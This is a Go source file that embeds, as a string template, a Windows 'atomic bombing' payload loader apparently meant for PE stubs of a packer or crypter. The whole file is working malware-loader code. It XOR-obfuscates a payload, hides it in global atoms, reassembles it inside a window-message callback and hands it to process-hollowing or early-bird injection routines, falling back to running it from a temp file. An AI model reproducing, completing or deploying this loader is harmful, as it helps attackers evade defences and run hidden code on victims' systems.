package windows

// AtomicBombingRuntime contains the Windows atomic bombing loader used by PE stubs.
const AtomicBombingRuntime = `
const (
	atomicChunkSize = 120
	atomicWMTrigger = 0x0400 + 0x1984
)

var (
	atomicAtomIDs   []uint16
	atomicInjector  func([]byte)
	errorClassExists = syscall.Errno(1410)
)

type atomicWndClassEx struct {
	CbSize        uint32
	Style         uint32
	LpfnWndProc   uintptr
	CbClsExtra    int32
	CbWndExtra    int32
	HInstance     syscall.Handle
	HIcon         syscall.Handle
	HCursor       syscall.Handle
	HbrBackground syscall.Handle
	LpszMenuName  *uint16
	LpszClassName *uint16
	HIconSm       syscall.Handle
}

type atomicPoint struct {
	X int32
	Y int32
}

type atomicMsg struct {
	HWnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      atomicPoint
	LPrivate uint32
}

func executeAtomicBombing(payload []byte) {
	if !atomicExecute(payload, executeProcessHollowing) {
		executeFromTemp(payload)
	}
}

func executeEarlyBirdAtomicBombing(payload []byte) {
	if !atomicExecute(payload, executeEarlyBird) {
		executeFromTemp(payload)
	}
}

func atomicExecute(payload []byte, injector func([]byte)) bool {
	ids, ok := atomicStoreAtoms(payload)
	if !ok {
		return false
	}
	atomicInjector = injector
	defer func() { atomicInjector = nil }()
	defer atomicDeleteAtoms(ids)
	atomicAtomIDs = ids
	if !atomicDispatchWindow() {
		return false
	}
	return true
}

func atomicStoreAtoms(payload []byte) ([]uint16, bool) {
	const xorKey byte = 0x5A
	var ids []uint16
	for offset := 0; offset < len(payload); offset += atomicChunkSize {
		end := offset + atomicChunkSize
		if end > len(payload) {
			end = len(payload)
		}
		chunk := make([]byte, end-offset)
		copy(chunk, payload[offset:end])
		for i := range chunk {
			chunk[i] ^= xorKey
		}
		utf16Buf := atomicHexEncode(chunk)
		if len(utf16Buf) == 0 {
			atomicDeleteAtoms(ids)
			return nil, false
		}
		id, _, _ := procGlobalAddAtom.Call(uintptr(unsafe.Pointer(&utf16Buf[0])))
		if id == 0 {
			atomicDeleteAtoms(ids)
			return nil, false
		}
		ids = append(ids, uint16(id))
	}
	return ids, true
}

func atomicHexEncode(src []byte) []uint16 {
	if len(src) == 0 {
		return nil
	}
	const hextable = "0123456789abcdef"
	buf := make([]uint16, len(src)*2+1)
	idx := 0
	for _, b := range src {
		buf[idx] = uint16(hextable[b>>4])
		buf[idx+1] = uint16(hextable[b&0x0F])
		idx += 2
	}
	buf[len(buf)-1] = 0
	return buf
}

func atomicDeleteAtoms(ids []uint16) {
	for _, id := range ids {
		procGlobalDeleteAtom.Call(uintptr(id))
	}
}

func atomicDispatchWindow() bool {
	namePtr, _ := syscall.UTF16PtrFromString("gosstrip.atomic")
	class := atomicWndClassEx{
		CbSize:        uint32(unsafe.Sizeof(atomicWndClassEx{})),
		LpfnWndProc:   syscall.NewCallback(atomicWindowProc),
		LpszClassName: namePtr,
	}
	if atom, _, _ := procRegisterClassEx.Call(uintptr(unsafe.Pointer(&class))); atom == 0 {
		if err := syscall.GetLastError(); err != nil {
			if errno, ok := err.(syscall.Errno); !ok || errno != errorClassExists {
				return false
			}
		} else {
			return false
		}
	}

	hwnd, _, _ := procCreateWindowEx.Call(
		0,
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(namePtr)),
		0,
		0, 0, 0, 0,
		0,
		0,
		0,
		0,
	)
	if hwnd == 0 {
		return false
	}
	defer procDestroyWindow.Call(hwnd)

	procSendMessage.Call(hwnd, atomicWMTrigger, 0, 0)

	var message atomicMsg
	for {
		ret, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&message)), 0, 0, 0)
		if int32(ret) == -1 {
			return false
		}
		if ret == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&message)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&message)))
	}
	return true
}

func atomicWindowProc(hwnd syscall.Handle, msg uint32, wparam, lparam uintptr) uintptr {
	switch msg {
	case atomicWMTrigger:
		payload := atomicRebuildPayload()
		if len(payload) > 0 {
			fn := atomicInjector
			atomicInjector = nil
			if fn != nil {
				fn(payload)
			} else {
				executeProcessHollowing(payload)
			}
		}
		procPostQuitMessage.Call(0)
		return 0
	default:
		ret, _, _ := procDefWindowProc.Call(uintptr(hwnd), uintptr(msg), wparam, lparam)
		return ret
	}
}

func atomicRebuildPayload() []byte {
	const xorKey byte = 0x5A
	if len(atomicAtomIDs) == 0 {
		return nil
	}
	result := make([]byte, 0, len(atomicAtomIDs)*atomicChunkSize)
	for _, id := range atomicAtomIDs {
		name := make([]uint16, 512)
		n, _, _ := procGlobalGetAtom.Call(
			uintptr(id),
			uintptr(unsafe.Pointer(&name[0])),
			uintptr(len(name)),
		)
		if n == 0 {
			return nil
		}
		chunk := atomicHexDecode(name[:n])
		if chunk == nil {
			return nil
		}
		for i := range chunk {
			chunk[i] ^= xorKey
		}
		result = append(result, chunk...)
	}
	return result
}

func atomicHexDecode(data []uint16) []byte {
	if len(data)%2 != 0 {
		return nil
	}
	out := make([]byte, len(data)/2)
	for i := 0; i < len(out); i++ {
		hi := atomicHexValue(data[2*i])
		lo := atomicHexValue(data[2*i+1])
		if hi < 0 || lo < 0 {
			return nil
		}
		out[i] = byte(hi<<4 | lo)
	}
	return out
}

func atomicHexValue(c uint16) int {
	switch {
	case c >= '0' && c <= '9':
		return int(c - '0')
	case c >= 'a' && c <= 'f':
		return int(c-'a') + 10
	case c >= 'A' && c <= 'F':
		return int(c-'A') + 10
	default:
		return -1
	}
}
`
